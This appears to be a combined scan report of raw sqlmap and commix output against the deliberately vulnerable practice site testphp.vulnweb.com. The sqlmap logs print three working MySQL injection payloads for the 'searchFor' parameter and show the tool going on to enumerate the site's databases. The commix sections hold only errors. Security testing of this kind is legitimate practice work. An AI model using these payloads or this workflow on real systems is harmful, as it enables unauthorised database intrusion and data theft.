[20:26:50] [WARNING] POST parameter 'searchFor' does not appear to be dynamic
[20:26:51] [INFO] heuristic (basic) test shows that POST parameter 'searchFor' might be injectable (possible DBMS: 'MySQL')
[20:26:51] [INFO] heuristic (XSS) test shows that POST parameter 'searchFor' might be vulnerable to cross-site scripting (XSS) attacks
[20:26:51] [INFO] testing for SQL injection on POST parameter 'searchFor'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:26:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:26:51] [WARNING] reflective value(s) found and filtering out
[20:26:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:26:54] [INFO] testing 'Generic inline queries'
[20:26:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:27:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:27:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[20:27:30] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[20:27:50] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[20:28:13] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[20:28:33] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[20:28:56] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[20:29:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:29:20] [INFO] POST parameter 'searchFor' appears to be 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable (with --string="Our")
[20:29:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:29:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:29:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:29:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:29:21] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[20:29:22] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[20:29:22] [INFO] POST parameter 'searchFor' is 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' injectable 
[20:29:22] [INFO] testing 'MySQL inline queries'
[20:29:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:29:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:29:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:29:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:29:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[20:29:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[20:29:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:29:45] [INFO] POST parameter 'searchFor' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[20:29:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:29:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:29:50] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[20:29:57] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[20:30:03] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[20:30:09] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[20:30:14] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[20:30:20] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[20:30:26] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[20:30:32] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[20:30:37] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[20:30:43] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
POST parameter 'searchFor' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 769 HTTP(s) requests:
---
Parameter: searchFor (POST)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: searchFor=cWmx' AND EXTRACTVALUE(2917,CASE WHEN (2917=2917) THEN 2917 ELSE 0x3A END) AND 'xZkh'='xZkh&goButton=go

    Type: error-based
    Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
    Payload: searchFor=cWmx' OR GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(3935=3935,1))),0x717a626a71),3935) AND 'KKaO'='KKaO&goButton=go

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchFor=cWmx' AND (SELECT 3488 FROM (SELECT(SLEEP(5)))BVaq) AND 'fccg'='fccg&goButton=go
---
do you want to exploit this SQL injection? [Y/n] Y
[20:30:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.6.40, Nginx 1.19.0
back-end DBMS: MySQL >= 5.6
[20:30:49] [INFO] fetching database names
[20:30:49] [INFO] resumed: 'information_schema'
[20:30:49] [INFO] resumed: 'acuart'
available databases [2]:
[*] acuart
[*] information_schema

SQL injection vulnerability has already been detected against 'testphp.vulnweb.com'. Do you want to skip further tests involving it? [Y/n] Y
[20:30:49] [INFO] skipping 'http://testphp.vulnweb.com/userinfo.php'
[20:30:49] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'C:\Users\suris\AppData\Local\sqlmap\output\results-02222025_0826pm.csv'

[*] ending @ 20:30:49 /2025-02-22/

```
---

# SQLMap Scan Results
**URL:** http://testphp.vulnweb.com/login.php
**Scope:** Page Only
**Results:**
```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.2#pip}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:59:19 /2025-02-22/

[20:59:19] [INFO] testing connection to the target URL
[20:59:19] [INFO] searching for forms
[20:59:20] [INFO] found a total of 2 targets
[1/2] Form:
POST http://testphp.vulnweb.com/search.php?test=query
POST data: searchFor=&goButton=go
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: searchFor=&goButton=go] (Warning: blank fields detected): searchFor=&goButton=go
do you want to fill blank fields with random values? [Y/n] Y
[20:59:20] [INFO] resuming back-end DBMS 'mysql' 
[20:59:20] [INFO] using 'C:\Users\suris\AppData\Local\sqlmap\output\results-02222025_0859pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: searchFor (POST)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: searchFor=cWmx' AND EXTRACTVALUE(2917,CASE WHEN (2917=2917) THEN 2917 ELSE 0x3A END) AND 'xZkh'='xZkh&goButton=go

    Type: error-based
    Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
    Payload: searchFor=cWmx' OR GTID_SUBSET(CONCAT(0x71766b6271,(SELECT (ELT(3935=3935,1))),0x717a626a71),3935) AND 'KKaO'='KKaO&goButton=go

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchFor=cWmx' AND (SELECT 3488 FROM (SELECT(SLEEP(5)))BVaq) AND 'fccg'='fccg&goButton=go
---
do you want to exploit this SQL injection? [Y/n] Y
[20:59:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.6.40, Nginx 1.19.0
back-end DBMS: MySQL >= 5.6
[20:59:20] [INFO] fetching database names
[20:59:20] [INFO] resumed: 'information_schema'
[20:59:20] [INFO] resumed: 'acuart'
available databases [2]:
[*] acuart
[*] information_schema

SQL injection vulnerability has already been detected against 'testphp.vulnweb.com'. Do you want to skip further tests involving it? [Y/n] Y
[20:59:20] [INFO] skipping 'http://testphp.vulnweb.com/userinfo.php'
[20:59:20] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'C:\Users\suris\AppData\Local\sqlmap\output\results-02222025_0859pm.csv'

[*] ending @ 20:59:20 /2025-02-22/

```
---
**Vulnerabilities:**
---

# Commix Scan Results
**URL:** http://testphp.vulnweb.com/login.php
**Scope:** Page Only
**Error:**
```
python: can't open file 'E:\\Web_Sec\\Web_Sec_Tool\\commix.py': [Errno 2] No such file or directory
```
---

# Commix Scan Results
**URL:** http://testphp.vulnweb.com/login.php
**Scope:** Page Only
**Results:**
```
                                      __
   ___   ___     ___ ___     ___ ___ /\_\   __  _
 /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v4.1-dev#11
/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
 \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection Exploitation Tool
Copyright � 2014-2025 Anastasios Stasinopoulos (@ancst)
+--

(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

[23:32:33] [info] Testing connection to the target URL. 
[23:32:35] [info] Checking if the target is protected by some kind of WAF/IPS.
[23:32:36] [info] Performing identification (passive) tests to the target URL.
[23:32:36] [critical] No parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--crawl=2'.
```
---
